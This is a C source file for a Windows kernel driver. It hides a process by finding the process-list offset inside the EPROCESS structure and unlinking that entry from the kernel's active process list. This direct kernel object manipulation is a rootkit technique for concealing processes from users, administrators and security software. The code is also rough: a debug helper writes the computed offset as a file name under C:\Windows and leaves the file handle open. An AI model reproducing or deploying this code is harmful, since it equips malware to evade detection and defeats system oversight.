#include "Driver.h"

PCHAR hidep(UINT32 pid) {

	

	PEPROCESS currentProcess = PsGetCurrentProcess();
	//ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440));	// 	- Would work for now, but only for the current version

	ULONG CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));

	ULONG LIST_OFFSET = 0x0;	// Offset in PEPROCESS for the linked list

	PEPROCESS checkp;
	for (unsigned int i = 16;; i += 4) { 
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &checkp))) { break; } 
	}

	// Find the offset of the list entry, currently it's 0x448, but since it can change, this is a more sustainable way to
	// do it
	for (unsigned int i = 0x0; i < 0x1000; i += 0x4) {

		if (CurrentPID == *(ULONG*)((UCHAR*)currentProcess + i)
			&& (ULONG)((ULONG_PTR)PsGetProcessId(checkp)) == *(ULONG*)((UCHAR*)checkp + i)) {

			LIST_OFFSET = i + sizeof(ULONG_PTR); break;
		}
	}
	
	// L"\\DosDevices\\C:\\Windows\\%lu"

	WCHAR buffer[150];
	swprintf_s(buffer, 150, L"\\DosDevices\\C:\\Windows\\%lu", LIST_OFFSET);
	debugFile(buffer);


	PLIST_ENTRY currentList = (LIST_ENTRY*)((ULONG_PTR)currentProcess + LIST_OFFSET);
	
	if (CurrentPID == pid) {

		PLIST_ENTRY prev = currentList->Blink;
		PLIST_ENTRY next = currentList->Flink;

		prev->Flink = next;
		next->Blink = prev;

		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
		currentList->Blink = currentList;
		currentList->Flink = currentList;
	}

	return NULL;
}

void debugFile(WCHAR name[]) {

	// START
	NTSTATUS ntstatus = STATUS_SUCCESS;
	/////////////////////// THIS SECTION /////////////////////////////////////
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
	RtlInitUnicodeString(&uniName, name);  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE,
		NULL, NULL);
	//////////////////////////////////

	///////////////////////////////////
	// Load the buffer (ie. contents of text file to the console)
	HANDLE handle;
	IO_STATUS_BLOCK    ioStatusBlock;
	ntstatus = ZwCreateFile(&handle,
		FILE_WRITE_DATA,
		&objAttr, &ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_NON_DIRECTORY_FILE,
		NULL, 0);

}